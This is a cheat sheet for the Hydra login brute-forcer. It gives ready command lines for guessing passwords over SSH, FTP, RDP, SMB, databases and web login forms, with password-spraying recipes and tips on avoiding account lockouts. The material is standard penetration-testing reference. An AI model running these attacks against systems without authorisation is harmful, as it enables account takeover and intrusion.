# Hydra Cheat Sheet
> Online login brute-forcer · Passwords · `apt install hydra`

---

## Quick start
```bash
hydra -l admin -P rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Common flags
| Flag | Meaning |
|---|---|
| `-l` | single username |
| `-L` | username list |
| `-p` | single password |
| `-P` | password list |
| `-C file` | combined user:pass list |
| `-t N` | parallel tasks (default 16) |
| `-f` | stop after first valid pair found |
| `-o file` | output found credentials |
| `-s PORT` | non-default port |
| `-v / -V` | verbose / show each attempt |

## Per-service syntax
```bash
hydra -l admin -P pass.txt ssh://target.com
hydra -l admin -P pass.txt ftp://target.com
hydra -l admin -P pass.txt rdp://target.com
hydra -L users.txt -P pass.txt smb://target.com
hydra -l admin -P pass.txt mysql://target.com
hydra -l admin -P pass.txt -s 5432 postgres://target.com
hydra -L users.txt -P pass.txt target.com -e nsr smtp   # try null/same-as-user/reverse
```

## HTTP form brute-force
```bash
# Format: /path:postdata:failure-condition
hydra -l admin -P pass.txt target.com http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Invalid credentials"

# With cookie/CSRF token pre-fetch handled by a wrapper script, or use Burp Intruder instead
hydra -l admin -P pass.txt target.com https-post-form \
  "/login:user=^USER^&pass=^PASS^:F=incorrect" -s 443
```

## Recipes
```bash
# Spray one password across many users (careful — lockout risk)
hydra -L users.txt -p Summer2026! target.com smb -t 4

# Combined creds list
hydra -C combos.txt ssh://target.com

# Multiple targets from a file
hydra -l admin -P pass.txt -M targets.txt ssh
```

## Gotchas / OPSEC
- Account lockout policies make password spraying (one password, many users) far safer than credential stuffing (many passwords, one user) — pace with `-t` and delays.
- `-f` saves time in CTF/lab settings but stops at the first hit — remove it if you need all valid pairs.
- HTTP form syntax is fragile — verify the failure string exactly matches the app's actual error text.

## See also
- https://github.com/vanhauser-thc/thc-hydra
- `passwords/hashcat.md`, `qyvora/toha3ee.md` (`auth.spray`, `auth.brute`)
